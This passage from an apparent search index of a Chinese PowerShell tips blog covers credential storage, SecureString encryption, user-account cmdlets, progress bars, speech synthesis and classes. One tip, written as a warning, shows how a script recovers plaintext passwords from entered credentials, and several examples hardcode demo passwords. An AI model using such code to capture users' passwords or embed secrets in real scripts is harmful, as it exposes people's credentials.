- 管理凭据（第一部分）","text":"假设您每天都要运行一个需要凭据的脚本。一个使用强壮凭据的安全方法是将它们保存到一个加密的文件中。这段代码提示输入凭据，然后将它们保存到您桌面上的 XML 文件中： 12$credential = Get-Credential -UserName train\\user02 -Message 'Please provide credentials'$credential | Export-Clixml -Path &quot;$home\\desktop\\myCredentials.xml&quot; 密码是以您的身份加密的，所以只有您（并且只能在保存凭据的机器上）能存取该凭据。 以下是读取保存的凭据的代码： 12345$credential = Import-Clixml -Path &quot;$home\\desktop\\myCredentials.xml&quot;# use the credential with any cmdlet that exposes the –Credential parameter# to log in to remote systemsGet-WmiObject -Class Win32_LogicalDisk -ComputerName SomeServer -Credential $credential","link":"/2017/01/04/managing-credentials-part-1/"},{"title":"PowerShell 技能连载 - 管理凭据（第二部分）","text":"对于无人值守运行的脚本，您可以从代码创建登录凭据。这需要将密码以明文的方式存在脚本中（这显然是不安全的，除非您用加密文件系统（EFS）加密您的脚本，或是用其它办法来保护内容）： 1234567$password = 'topsecret!' | ConvertTo-SecureString -AsPlainText -Force$username = 'myCompany\\myUserName'$credential = New-Object -TypeName PSCredential($username, $password)# use the credential with any cmdlet that exposes the –Credential parameter# to log in to remote systemsGet-WmiObject -Class Win32_LogicalDisk -ComputerName SomeServer -Credential $credential","link":"/2017/01/05/managing-credentials-part-2/"},{"title":"PowerShell 技能连载 - 管理凭据（第三部分）","text":"对于无人值守的脚本，以硬编码的方式将密码保存在脚本中是不安全且不推荐的。 有一种替代方法是，您可以一次性提示输入密码，然后创建一个凭据对象，然后在您的脚本中需要的地方使用它。这段代码提示输入一个密码，然后创建一个凭据对象： 123$password = Read-Host -AsSecureString -Prompt 'Enter Password'$username = 'myCompany\\myUserName'$credential = New-Object -TypeName PSCredential($username, $password) 凭据对象可以用在任何接受 -Credential 参数的 cmdlet 中。 123# use the credential with any cmdlet that exposes the –Credential parameter# to log in to remote systemsGet-WmiObject -Class Win32_LogicalDisk -ComputerName SomeServer -Credential $credential","link":"/2017/01/06/managing-credentials-part-3/"},{"title":"PowerShell 技能连载 - 管理凭据（第四部分）","text":"在前一个脚本中我们演示了如何以加密的方式将一个凭据保存到磁盘上。一个类似的方法只将密码保存到加密的文件中。这段代码将创建一个加密的密码文件： 123# read in the password, and save it encrypted$text = Read-Host -AsSecureString -Prompt 'Enter Password'$text | Export-Clixml -Path &quot;$home\\desktop\\mypassword.xml&quot; 它只能由保存的人读取，而且必须在同一台机子上操作。第二个脚本可以用该密码登录其它系统而无需用户交互： 123456# read in the secret and encrypted password from file$password = Import-Clixml -Path &quot;$home\\desktop\\mypassword.xml&quot;# add the username and create a credential object$username = 'yourCompany\\yourUserName'$credential = New-Object -TypeName PSCredential($username, $password) 凭据对象可以用在所有支持 -Credential 参数的 cmdlet 中。 123# use the credential with any cmdlet that exposes the –Credential parameter# to log in to remote systemsGet-WmiObject -Class Win32_LogicalDisk -ComputerName SomeServer -Credential $credential","link":"/2017/01/09/managing-credentials-part-4/"},{"title":"PowerShell 技能连载 - 管理凭据（第五部分）","text":"当 PowerShell 自动加密一个安全字符串时，它使用您的身份作为密钥。只有您可以解密该安全字符串。而如果您想用一个共享的密码来加密一段安全字符串，会怎么样呢？ 以下是一个经典的做法，用密码来加密： 123456789# $secretKey MUST be of length 8 or 16# anyone who knows the secret can decrypt the password$secretKey = 'mysecretmysecret'$password = 'myPassword'$SecureString = ConvertTo-SecureString -String $password -AsPlainText -Force$RandomSecureString = ConvertTo-SecureString -String $secretKey -AsPlainText -Force$encryptedPassword = ConvertFrom-SecureString -SecureString $SecureString -SecureKey $RandomSecureString$encryptedPassword 该密钥 ($secretKey) 必须是 8 或 16 个字符的文本。任何知道密钥的人都可以解密（这就是为何 secretKey 不应该是脚本的一部分，而下面的脚本下方加入了硬编码的密钥是为了演示解密的过程。最好以交互的方式输入密钥）： 123456789# this is the key to your secret$secretKey = 'mysecretmysecret'# this is the encrypted secret as produced by the former code$encryptedPassword = '76492d1116743f0423413b16050a5345MgB8AEMARQAxAFgAdwBmAHcARQBvAGUAKwBOAGoAYgBzAE4AUgBnAHoARABSAHcAPQA9AHwANQA3ADYAMABjAGYAYQAwAGMANgBkADQAYQBiADYAOAAyAGYAZAA5AGYAMwA5AGYAYQBjADcANQA5ADIAYwAzADkAMAA2ADQANwA1ADcAMQA3ADMAMwBmAGMAMwBlADIAZQBjADcANgAzAGQAYQA1AGIAZABjADYAMgA2AGQANAA='$RandomSecureString = ConvertTo-SecureString -String $secretKey -AsPlainText -Force$securestring = $encryptedPassword | ConvertTo-SecureString -SecureKey $RandomSecureString# Result is a secure string$SecureString 结果是一个安全字符串，您可以用它来构建一个完整的凭据： 12$credential = New-Object -TypeName PSCredential('yourcompany\\youruser', $SecureString)$credential 您也可以再次检查密码明文： PS C:\\Users\\tobwe&gt; $credential.GetNetworkCredential().Password myPassword 请注意安全字符串的所有者（创建它的人）总是可以取回明文形式的密码。这并不是一个安全问题。创建安全字符串的人在过去的时刻已经知道了密码。安全字符串保护第三方的敏感数据，并将它以其他用户无法接触到的形式保存到内存中。 密钥和对称加密算法的问题是您需要分发密钥，而密钥需要被保护，它既可以用来加密也可以用来解密。 在 PowerShell 5 中有一个简单得多的方法：Protect-CMSMessage 和 Unprotect-CMSMessage，它们使用数字证书和非对称加密。通过这种方法，加密安全信息的一方无需知道解密的密钥，反之亦然。加密的一方只需要制定谁（哪个证书）可用来解密保密信息。","link":"/2017/01/10/managing-credentials-part-5/"},{"title":"PowerShell 技能连载 - 小心 Get-Credential 和 SecureString","text":"有些时候，脚本以交互的方式询问凭据或密码。请时刻注意脚本的作者可以获取所有输入信息的明文。仅当您信任脚本和作者的时候才可以输入敏感信息。 请注意：这并不是一个 PowerShell 问题，这是所有软件的共同问题。 让我们看看一个脚本如何利用输入的密码。如果一个脚本需要完整的凭据，它可以检查凭据对象并解出密码明文： 1234$credential = Get-Credential$password = $credential.GetNetworkCredential().Password&quot;The password entered was: $password&quot; 类似地，当提示您输入密码作为安全字符串时，脚本的作者也能获取到输入的明文： 1234567$password = Read-Host -AsSecureString -Prompt 'Enter Password'# this is how the owner of a secure string can get back the plain text:$BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($password)$plaintext = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)&quot;The password entered was $plaintext&quot;","link":"/2017/01/11/careful-with-get-credential-and-securestrings/"},{"title":"PowerShell 技能连载 - 获取 AD 用户属性","text":"缺省情况下，Get-ADUser（由 ActiveDirectory 模块提供，该模块是免费的 Microsoft RSAT 工具的一部分）只获取一小部分缺省属性。要获取更多信息，请使用 -Properties 参数，并且指定您需要获取的属性。 要获取所有 AD 用户的列表，以及他们的备注和描述字段，请使用这段代码： #requires -Modules ActiveDirectory Get-ADUser -Filter * -Properties Description, Info 如果你不知道所有可用属性的名字，请使用“*”代替，来获取所有可用的属性。","link":"/2017/01/12/getting-ad-user-attributes/"},{"title":"PowerShell 技能连载 - 管理本地用户","text":"PowerShell 5.1 终于发布了管理本地用户账户的 cmdlet。要获取本地用户账户的列表，请使用 Get-LocalUser 并将结果通过管道传给 Select-Object 命令来查看所有属性： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748PS C:\\&gt; Get-LocalUser | Select-Object -Property *AccountExpires :Description : Predefined Account to manage computer or domainEnabled : FalseFullName :PasswordChangeableDate :PasswordExpires :UserMayChangePassword : TruePasswordRequired : TruePasswordLastSet : 7/10/2015 2:22:01 PMLastLogon : 12/8/2015 5:44:47 AMName : AdministratorSID : S-1-5-21-2012478179-265285931-690539891-500PrincipalSource : LocalObjectClass : UserAccountExpires :Description : User Account managed by systemEnabled : FalseFullName :PasswordChangeableDate :PasswordExpires :UserMayChangePassword : TruePasswordRequired : FalsePasswordLastSet :LastLogon :Name : DefaultAccountSID : S-1-5-21-2012478179-265285931-690539891-503PrincipalSource : LocalObjectClass : UserAccountExpires :Description : Predefined Account for Guest accessEnabled : FalseFullName :PasswordChangeableDate :PasswordExpires :UserMayChangePassword : FalsePasswordRequired : FalsePasswordLastSet :LastLogon :Name : GuestSID : S-1-5-21-2012478179-265285931-690539891-501PrincipalSource : LocalObjectClass : User...","link":"/2017/01/13/managing-local-users/"},{"title":"PowerShell 技能连载 - 探索本地账户管理 cmdlet","text":"PowerShell 5.1（随着 Windows 10 和 Server 2016 发布）现在原生支持管理本地账户。在前一个技能中您学习了如何使用 Get-LocalUser 命令。 要探索本地账户管理的其它 cmdlet，以下是如何识别暴露 Get-LocalUser 命令的模块的方法，然后列出该模块的其它 cmdlet： 12345678#requires -Modules Microsoft.PowerShell.LocalAccounts# find module that defines this cmdlet$module = Get-Command -Name Get-LocalUser | Select-Object -ExpandProperty Source# list all cmdlets defined by this moduleGet-Command -Module $module 最终，列出所有新的管理 cmdlet： 1234567891011121314151617CommandType Name Version Source----------- ---- ------- ------Cmdlet Add-LocalGroupMember 1.0.0.0 Microsoft.PowerShell.LocalAccountsCmdlet Disable-LocalUser 1.0.0.0 Microsoft.PowerShell.LocalAccountsCmdlet Enable-LocalUser 1.0.0.0 Microsoft.PowerShell.LocalAccountsCmdlet Get-LocalGroup 1.0.0.0 Microsoft.PowerShell.LocalAccountsCmdlet Get-LocalGroupMember 1.0.0.0 Microsoft.PowerShell.LocalAccountsCmdlet Get-LocalUser 1.0.0.0 Microsoft.PowerShell.LocalAccountsCmdlet New-LocalGroup 1.0.0.0 Microsoft.PowerShell.LocalAccountsCmdlet New-LocalUser 1.0.0.0 Microsoft.PowerShell.LocalAccountsCmdlet Remove-LocalGroup 1.0.0.0 Microsoft.PowerShell.LocalAccountsCmdlet Remove-LocalGroupMember 1.0.0.0 Microsoft.PowerShell.LocalAccountsCmdlet Remove-LocalUser 1.0.0.0 Microsoft.PowerShell.LocalAccountsCmdlet Rename-LocalGroup 1.0.0.0 Microsoft.PowerShell.LocalAccountsCmdlet Rename-LocalUser 1.0.0.0 Microsoft.PowerShell.LocalAccountsCmdlet Set-LocalGroup 1.0.0.0 Microsoft.PowerShell.LocalAccountsCmdlet Set-LocalUser 1.0.0.0 Microsoft.PowerShell.LocalAccounts","link":"/2017/01/16/exploring-local-account-management-cmdlets/"},{"title":"PowerShell 技能连载 - 定位锁定的 AD 账户","text":"在搜索指定的 AD 账户时，您可能曾经用过 Get-ADUser 命令，并且用 filter 参数来过滤结果。不过这样的过滤器可能会变得非常复杂。 这就是为什么针对最常见的 AD 搜索有一个快捷方式。只需要用 Search-ADAccount 命令即可： 123456#requires -Modules ActiveDirectorySearch-ADAccount -AccountDisabledSearch-ADAccount -AccountExpiredSearch-ADAccount -AccountInactive Search-ADAccount 暴露一系列参数来搜索最常见的条件。","link":"/2017/01/17/identifying-locked-ad-accounts/"},{"title":"PowerShell 技能连载 - 批量重命名照片","text":"以下是一个快速批量重命名文件的方法，可以用于照片或其它文件。请看： 123456#requires -Version 1.0$Path = &quot;$home\\Pictures&quot;$Filter = '*.jpg'Get-ChildItem -Path $Path -Filter $Filter | Rename-Item -NewName {$_.name -replace 'DSC','TEST'} 只需要调整路径和过滤器，使之指向所需的文件即可。在这个例子中，照片文件夹中的所有 *.jpg 文件中，关键字 “DSC” 将被替换成 “TEST”。请在使用前将脚本的参数改为您想要的。 要递归地重命名文件，请向 Get-ChildItem 命令添加 -Recurse 参数。但是，请小心。这一小段代码可能会导致一不小心对无数文件重命名。","link":"/2017/01/18/bulk-renaming-photos/"},{"title":"PowerShell 技能连载 - 隐藏进度条","text":"有些 cmdlet 和脚本使用进度条来指示进度。如您在前一个技能中所学的，进度条可能会导致延迟，所以如果您如果不想指示进度，您可能会希望隐藏进度条。以下是实现方法： 以下代码从互联网下载一张图片。Invoke-WebRequest 处理耗时的操作并且在下载时显示一个进度条： 12345678#requires -Version 3.0$path = &quot;$home\\Pictures\\psconf15.jpg&quot;$url = 'http://www.powertheshell.com/wp-content/uploads/groupWPK2015.jpg'Invoke-WebRequest -Uri $url -OutFile $pathInvoke-Item -Path $path 如果您不想显示进度条，请使用 $ProgressPreference 变量，临时隐藏进度条。请注意代码是如何用大括号包裹起来，并且用 ”&amp;“ 号执行的。通过这种方法，当代码执行完毕后，所有在大括号中改变的变量都会被忽略，所以您不需要将 $ProgressPreference 变量重置为原来的值。 1234567891011#requires -Version 3.0&amp; { $ProgressPreference = 'SilentlyContinue' $path = &quot;$home\\Pictures\\psconf15.jpg&quot; $url = 'http://www.powertheshell.com/wp-content/uploads/groupWPK2015.jpg' Invoke-WebRequest -Uri $url -OutFile $path}Invoke-Item -Path $path","link":"/2017/01/20/hiding-progress-bars/"},{"title":"PowerShell 技能连载 - 明智地使用进度条","text":"PowerShell 支持使用进度条。这是一个很简单的例子： 12341..100 | ForEach-Object { Write-Progress -Activity 'Counting' -Status &quot;Processing $_&quot; -PercentComplete $_ Start-Sleep -Milliseconds 100} 如果您没有过度使用 Write-Progress，那么使用进度条是很有价值的。特别在一个长时间的循环中，在循环的每一圈中调用一次 Write-Progress 并没有意义。如果那么做，脚本会变得非常慢。 假设您的循环运行 10000 次。显示一个进度条会显著地拖慢脚本： 12345678910111213$min = 1$max = 10000$start = Get-Date$min..$max | ForEach-Object { $percent = $_ * 100 / $max Write-Progress -Activity 'Counting' -Status &quot;Processing $_&quot; -PercentComplete $percent}$end = Get-Date($end-$start).TotalMilliseconds 延迟的时间和 Write-Progress 的调用次数直接相关，所以如果您将 $max 的值改为 100000，该脚本会运行 10 倍的时间，只因为 Write-Progress 调用的次数达到 10 倍。 所以您需要使用一种智能的机制来限制 Write-Progress 的次数。以下例子每增加 0.1% 时跟新一次进度条： 1234567891011121314151617181920$min = 1$max = 10000$start = Get-Date# update progress bar every 0.1 %$interval = $max / 1000$min..$max | ForEach-Object { $percent = $_ * 100 / $max if ($_ % $interval -eq 0) { Write-Progress -Activity 'Counting' -Status &quot;Processing $_&quot; -PercentComplete $percent }}$end = Get-Date($end-$start).TotalMilliseconds 当您增加 $max 的数值，您会注意到脚本并不会增加多少时间，因为调用 Write-Progress 的次数仍然没变。","link":"/2017/01/19/using-a-progress-bar-wisely/"},{"title":"PowerShell 技能连载 - 在资源管理器中打开 PowerShell","text":"一个在文件资源管理器中快速启动 PowerShell 的办法是导航到您数据的文件夹，然后点击导航条。这时导航面包屑控件变成了文件夹路径。将它改为 “powershell”，并按下回车键。 这时会打开 PowerShell，并且当前文件夹会设置为您导航到的文件夹。 不过，当前路径下有一个名为 “powershell” 的子文件夹时，这个技巧会失效。在这个例子中，文件资源管理器只会导航到该目录中。","link":"/2017/01/23/opening-powershell-inside-explorer/"},{"title":"PowerShell 技能连载 - 检查整数的位数","text":"有些时候您可能会需要检查一个整数的位数，例如验证用户的输入。以下是一个非常简单的使用正则表达式的方法： 123456789101112131415# check the number of digits in an integer$integer = 5721567# is it between 4 and 6 digits?$is4to6 = $integer -match '^\\d{4,6}$'# is it exactly 7 digits?$is7 = $integer -match '^\\d{7}$'# is it at least 4 digits?$isatleast4 = $integer -match '^\\d{4,}$'&quot;4-6 digits? $is4to6&quot;&quot;exactly 7 digits? $is7&quot;&quot;at least 4 digits? $isatleast4&quot; 这个例子演示了如何检查是否是恰好的位数，或者位数处于某个范围。请注意 “^” 代表表达式的起始，”$” 代表表达式的结尾。”\\d” 表示一位数字，大括号确定位数。","link":"/2017/01/24/checking-number-of-digits-in-integer/"},{"title":"PowerShell 技能连载 - 增加和删除反斜杠","text":"我们处理路径时，常常需要使路径“标准化”。例如确保所有的路径都以反斜杠结尾。一种尝试如下： 123456$path = 'c:\\temp'if ($path -notmatch '\\\\$') { $path += '\\' }$path 这段代码用正则表达式来查找一段文本尾部的反斜杠。如果不存在，则添加一个反斜杠。 如果您想删除路径尾部的反斜杠，您可以直接使用 -replace 运算符： 12$path = 'c:\\temp\\' -replace '\\\\$'$path","link":"/2017/01/25/adding-and-removing-backslashes/"},{"title":"PowerShell 技能连载 - 语音之周：使用语音讲述人","text":"当您将 “System.Speech“ 程序集添加到 PowerShell 中后，就可以使用新增的 “SpeechSynthesizer“ 类将文字转成语音： 123Add-Type -AssemblyName System.Speech$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer$speak.Speak('Hello I am PowerShell!') 请注意语音讲述人用的是您系统的缺省语音。您的讲述人缺省情况下可能说的不是英文。我们将在接下来的技能当中介绍如何使用不同的语音。","link":"/2017/01/26/speech-week-using-a-speech-synthesizer/"},{"title":"PowerShell 技能连载 - 语音之周：更改讲述人的语音","text":"在前一个技能中我们演示了如何使用语音转换器来念出文本。以下是查找您系统中安装的语言的方法： 123456#requires -Version 2.0Add-Type -AssemblyName System.Speech$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer$speak.GetInstalledVoices() | Select-Object -ExpandProperty VoiceInfo | Select-Object -Property Culture, Name, Gender, Age 结果类似如下： 12345Culture Name Gender Age------- ---- ------ ---en-US Microsoft Zira Desktop Female Adulten-US Microsoft David Desktop Male Adultde-DE Microsoft Hedda Desktop Female Adult 用这行代码可以返回缺省的语音： 1$speak.Voice 假设您的系统安装了多个语音，以下是选择一个不同语音的方法。只需要传入您想使用的语音名字。这个例子在德文 Windows 10 系统上使用德语语音引擎： 12345#requires -Version 2.0Add-Type -AssemblyName System.speech$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer$speak.SelectVoice('Microsoft Hedda Desktop')$speak.Speak('Jetzt spreche ich deutsch.')","link":"/2017/01/27/speech-week-using-different-voices-with-speech-synthesizer/"},{"title":"PowerShell 技能连载 - 语音之周：记录语音到文件合成器","text":"内置的 Microsoft 文本到语音引擎可以将音频文件保存到文件。通过这种方式，您可以自动生成 WAV 文件。以下是一个例子：它在您的桌面上创建一个新的 “clickme.wav” 文件，当您打开这个文件时，将会听到语音文本： 12345678910#requires -Version 2.0$Path = &quot;$home\\Desktop\\clickme.wav&quot;Add-Type -AssemblyName System.Speech$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer$speak.SetOutputToWaveFile($Path)$speak.Speak('Hello I am PowerShell!')$speak.SetOutputToDefaultAudioDevice()Invoke-Item -Path $Path","link":"/2017/01/30/speech-week-recording-voice-to-file-synthesizer/"},{"title":"PowerShell 技能连载 - 语音之周：使用语音合成器高级选项","text":".NET 语音引擎不止可以接受文本输入。如果您使用 SpeakSsm()，您可以使用 XML 来切换语言、速度，以及其它文本到语音转换的参数。 以下例子需要同时安装了英语和德语的语音。如果您没有安装德语语音，请使当地修改脚本中的语言 ID。以下是查找系统中可用的语言 ID 的方法： 12345678PS C:\\&gt; Add-Type -AssemblyName System.SpeechPS C:\\&gt; $speak.GetInstalledVoices() | Select-Object -ExpandProperty VoiceInfo | Select-Object -ExpandProperty Culture | Sort-Object -UniqueLCID Name DisplayName---- ---- -----------1031 de-DE German (Germany)1033 en-US English (United States) 以下是完整的例子： 12345678910111213141516171819202122232425#requires -Version 2.0Add-Type -AssemblyName System.Speech$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer$ssml = '&lt;speak version=&quot;1.0&quot; xmlns=&quot;http://www.w3.org/2001/10/synthesis&quot; xml:lang=&quot;en-US&quot;&gt; &lt;voice xml:lang=&quot;en-US&quot;&gt; &lt;prosody rate=&quot;1&quot;&gt; &lt;p&gt;I can speak English!&lt;/p&gt; &lt;/prosody&gt; &lt;/voice&gt; &lt;voice xml:lang=&quot;de-DE&quot;&gt; &lt;prosody rate=&quot;1&quot;&gt; &lt;p&gt;und ich kann auch deutsch sprechen!&lt;/p&gt; &lt;/prosody&gt; &lt;/voice&gt; &lt;voice xml:lang=&quot;en-US&quot;&gt; &lt;prosody rate=&quot;0&quot;&gt; &lt;p&gt;...and sometimes I get really tired.&lt;/p&gt; &lt;/prosody&gt; &lt;/voice&gt;&lt;/speak&gt;'$speak.SpeakSsml($ssml)","link":"/2017/01/31/speech-week-using-advanced-speech-synthesizer-options-synthesizer/"},{"title":"PowerShell 技能连载 - 加速 New-Object Synthesizer","text":"New-Object 创建新的对象实例，在之前的“语音之周”中，您已经见到了如何创建一个语音合成器对象，并且将文本转换为语音： 123Add-Type -AssemblyName System.Speech$speak = New-Object -TypeName System.Speech.Synthesis.SpeechSynthesizer$speak.Speak('Hello I am PowerShell!') 创建对象的方法是类似的，所以如果换成一个不同的类，例如 System.Net.NetworkInformation.Ping，就可以 ping 某个 IP 地址或主机名： 12345$ping = New-Object -TypeName System.Net.NetworkInformation.Ping$timeout = 1000$result = $ping.Send('powershellmagazine.com', $timeout)$result 在 PowerShell 5.0 或以上版本，有另一种方法来代替 New-Object，而且用起来更快：使用任意类型暴露的 New() 静态方法。您可以像这样重写以上的例子： 123Add-Type -AssemblyName System.Speech$speak = [System.Speech.Synthesis.SpeechSynthesizer]::New()$speak.Speak('Hello I am PowerShell!') 类似地： 12345$ping = [System.Net.NetworkInformation.Ping]::New()$timeout = 1000$result = $ping.Send('powershellmagazine.com', $timeout)$result 或者，可以精简： 1[System.Net.NetworkInformation.Ping]::New().Send('powershellmagazine.com', 1000) 请注意：一旦您使用 New() 来代替 New-Object，您的代码需要 PowerShell 5.0 以上版本。","link":"/2017/02/01/speeding-up-new-object-synthesizer/"},{"title":"PowerShell 技能连载 - 确定个人年龄","text":"您是如何基于生日确定一个人的年龄？您可以将 Get-Date 命令返回的当前时间减去生日事件，但是结果并不包含年数： 1234567#requires -Version 1.0$birthday = Get-Date -Date '1978-12-09'$today = Get-Date$timedifference = $today - $birthday$timedifference 以下是结果： 1234567891011Days : 13905Hours : 16Minutes : 34Seconds : 58Milliseconds : 575Ticks : 12014516985758198TotalDays : 13905.6909557387TotalHours : 333736.582937728TotalMinutes : 20024194.9762637TotalSeconds : 1201451698.57582TotalMilliseconds : 1201451698575.82 要计算年数，请取 “ticks” 的数值（衡量时间最小单位），并且转换为 datetime 类型，然后取年数并减一： 12345678#requires -Version 1.0$birthdayString = '1978-12-09'$birthday = Get-Date -Date $birthdayString$today = Get-Date$timedifference = $today - $birthday$ticks = $timedifference.Ticks$age = (New-Object DateTime -ArgumentList $ticks).Year -1&quot;Born on $birthdayString = $age Years old (at time of printing)&quot; 这是计算结果的样子： 1Born on 1978-12-09 = 38 Years old (at time of printing)","link":"/2017/02/02/determining-person-age/"},{"title":"PowerShell 技能连载 - 使用命名空间","text":"使用 .NET 的类型名称很麻烦，因为这些名字很长。以下是一个例子： 12345#requires -Version 2.0Add-Type -AssemblyName System.Speech$speak = New-Object -TypeName System.Speech.Synthesis.SpeechSynthesizer$speak.Speak('Hello I am PowerShell!') 在 PowerShell 5.0 以上版本，您可以定义希望使用的 .NET 命名空间。这些 “using namespace“ 语句必须放在脚本的开头。此时代码的可读性变得更好，并且 using 语句明确了该脚本使用了哪些 .NET 命名空间： 12345678#requires -Version 5.0using namespace System.Speech.SynthesisAdd-Type -AssemblyName System.Speech$speak = New-Object -TypeName SpeechSynthesizer$speak.Speak('Hello I am PowerShell!') 以下是另一个例子：System.IO.Path .NET 命名空间包含一系列有用的路径工具方法。以下是一些例子： 12[System.IO.Path]::ChangeExtension('test.txt', 'bat')[System.IO.Path]::GetExtension('test.txt') 现在可以不必重复地使用 [System.IO.Path] 来访问这些方法。添加一句 “using namespace System.IO“ 语句之后就可以直接访问 [Path] 类型： 123456#requires -Version 5.0using namespace System.IO[Path]::ChangeExtension('test.txt', 'bat')[Path]::GetExtension('test.txt')","link":"/2017/02/03/using-using-namespace/"},{"title":"PowerShell 技能连载 - 使用类（创建对象 - 第一部分）","text":"从 PowerShell 5.0 开始，引入了一个新的关键字 “class”。它能够创建新的类。您可以使用类作为新对象的模板。一下代码定义了一个名为 “Info” 的新类的模板，这个类有一系列属性： 1234567891011121314151617181920212223#requires -Version 5.0class Info{ $Name $Computer $Date}# generic syntax to create a new object instance$infoObj = New-Object -TypeName Info# alternate syntax PS5 or better (shorter and faster)$infoObj = [Info]::new()$infoObj$infoObj.Name = $env:COMPUTERNAME$infoObj.Computer = $env:COMPUTERNAME$infoObj.Date = Get-Date$infoObj$infoObj.GetType().Name 您可以使用 New-Object 来创建这个类的任意多个新实例。每个实例代表有三个属性的 “Info” 类型的一个新对象。 12345Name Computer Date---- -------- ----DESKTOP-7AAMJLF DESKTOP-7AAMJLF 1/2/2017 2:00:02 PMInfo 这是一个非常简单（但很有用）的例子，演示了如何使用类来生产对象。如果您只希望在新对象中存储一些零碎信息，您也可以使用 PowerShell 3.0 引入的 [PSCustomObject] 语法： 123456789#requires -Version 3.0$infoObj = [PSCustomObject]@{ Name = $env:COMPUTERNAME Computer = $env:COMPUTERNAME Date = Get-Date}$infoObj$infoObj.GetType().Name 这种做法没有使用一个蓝本（类），而是根据哈希表创建独立的新对象： 1234Name Computer Date---- -------- ----DESKTOP-7AAMJLF DESKTOP-7AAMJLF 1/2/2017 2:02:39 PMPSCustomObject 所以新创建的对象类型永远是 “PSCustomObject“而在前一个例子中，对象的类型是通过类名定义的。","link":"/2017/02/06/using-classes-creating-objects-part-1/"},{"title":"PowerShell 技能连载 - 使用类（初始化属性 - 第二部分）","text":"可以为类的属性手动指定一个数据类型和缺省值。当您从一个类实例化一个对象时，属性已经填充好并且只接受指定的数据类型： 1234567891011121314151617181920212223#requires -Version 5.0class Info{ # strongly typed properties with default values [String] $Name = $env:USERNAME [String] $Computer = $env:COMPUTERNAME [DateTime] $Date = (Get-Date)}# create instance$infoObj = [Info]::new()# view default (initial) values$infoObj# change value$infoObj.Name = 'test'$infoObj","link":"/2017/02/07/using-classes-initializing-properties-part-2/"},{"title":"PowerShell 技能连载 - 使用类（增加方法 - 第三部分）","text":"相对于 [PSCustomObject]，使用 class 的最大好处之一是它也可以定义方法（命令）。以下例子实现了秒表功能。秒表可以用来计算代码执行了多少时间： 12345678910111213141516171819202122232425#requires -Version 5.0class StopWatch{ # property is marked &quot;hidden&quot; because it is used internally only # it is not shown by IntelliSense hidden [DateTime]$LastDate = (Get-Date) [int] TimeElapsed() { # get current date $now = Get-Date # and subtract last date, report back milliseconds $milliseconds = ($now - $this.LastDate).TotalMilliseconds # use $this to access internal properties and methods # update the last date so that it now is the current date $this.LastDate = $now # use &quot;return&quot; to define the return value return $milliseconds } Reset() { $this.LastDate = Get-Date }} 以下是秒表的使用方法： 12345678910# create instance$stopWatch = [StopWatch]::new()$stopWatch.TimeElapsed()Start-Sleep -Seconds 2$stopWatch.TimeElapsed()$a = Get-Service$stopWatch.TimeElapsed() 结果类似如下： 1230201869 当您在一个函数中定义方法时，要遵守一系列规则： 如果一个方法有返回值，那么必须指定返回值的数据类型 方法的返回值必须用关键字“return”来指定 方法中不能使用未赋值的变量，也不能从父作用域中读取变量 要引用这个类中的属性或方法，请在前面加上“$this.”","link":"/2017/02/08/using-classes-adding-methods-part-3/"},{"title":"PowerShell 技能连载 - 使用类（重载 - 第四部分）","text":"类中的方法可以重载：您可以定义多个同名的方法，但是参数类型不同。它用起来和 cmdlet 中的参数集类似。请看： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#requires -Version 5.0class StopWatch{ # property is marked &quot;hidden&quot; because it is used internally only # it is not shown by IntelliSense hidden [DateTime]$LastDate = (Get-Date) # when no parameter is specified, do not emit verbose info [int] TimeElapsed() { return $this.TimeElapsedInternal($false) } # user can decide whether to emit verbose info or not [int] TimeElapsed([bool]$Verbose) { return $this.TimeElapsedInternal($Verbose) } # this method is called by all public methods hidden [int] TimeElapsedInternal([bool]$Verbose) { # get current date $now = Get-Date # and subtract last date, report back milliseconds $milliseconds = ($now - $this.LastDate).TotalMilliseconds # use $this to access internal properties and methods # update the last date so that it now is the current date $this.LastDate = $now # output verbose information if requested if ($Verbose) { $VerbosePreference = 'Continue' Write-Verbose &quot;Last step took $milliseconds ms.&quot; } # use &quot;return&quot; to define the return value return $milliseconds } Reset() { $this.LastDate = Get-Date }}# create instance$stopWatch = [StopWatch]::new()# do not output verbose info$stopWatch.TimeElapsed()Start-Sleep -Seconds 2# output verbose info$stopWatch.TimeElapsed($true)$a = Get-Service# output verbose info$stopWatch.TimeElapsed($true) 结果类似如下： 123450VERBOSE: Last step took 2018.1879 ms.2018VERBOSE: Last step took 68.8883 ms.69","link":"/2017/02/09/using-classes-overloading-part-4/"},{"title":"PowerShell 技能连载 - 使用类（构造函数 - 第五部分）","text":"Class 也可以称为构造函数。构造函数是创建一个新对象的方法。构造函数只是和类名相同的方法。通过构造函数，可以更简单地创建事先为属性赋过值的对象。以下是一个例子：“Person”类定义了一个 person。 以下是一个构造函数，输入姓和名，以及生日。当一个对象实例化的时候，构造函数会被调用，并且事先填充好对象的属性： 1234567891011121314151617181920#requires -Version 5.0class Person{ [string]$FirstName [string]$LastName [int][ValidateRange(0,100)]$Age [DateTime]$Birthday # constructor Person([string]$FirstName, [string]$LastName, [DateTime]$Birthday) { # set object properties $this.FirstName = $FirstName $this.LastName = $LastName $this.Birthday = $Birthday # calculate person age $ticks = ((Get-Date) - $Birthday).Ticks $this.Age = (New-Object DateTime -ArgumentList $ticks).Year-1 }} 有了这个类之后，您可以很方便地创建 person 对象的列表： 123[Person]::new('Tobias','Weltner','2000-02-03')[Person]::new('Frank','Peterson','1976-04-12')[Person]::new('Helen','Stewards','1987-11-19') 结果类似如下： 12345FirstName LastName Age Birthday--------- -------- --- --------Tobias Weltner 16 2/3/2000 12:00:00 AMFrank Peterson 40 4/12/1976 12:00:00 AMHelen Stewards 29 11/19/1987 12:00:00 AM","link":"/2017/02/10/using-classes-constructors-part-5/"},{"title":"PowerShell 技能连载 - 使用类（静态成员 - 第六部分）","text":"Class 可以定义所谓的“静态”成员。静态成员（属性和方法）可以通过类本身调用，而不需要对象实例。 看看这个例子： 1234567891011121314151617181920#requires -Version 5.0class TextToSpeech{ # store the initialized synthesizer here hidden static $synthesizer # static constructor, gets called whenever the type is initialized static TextToSpeech() { Add-Type 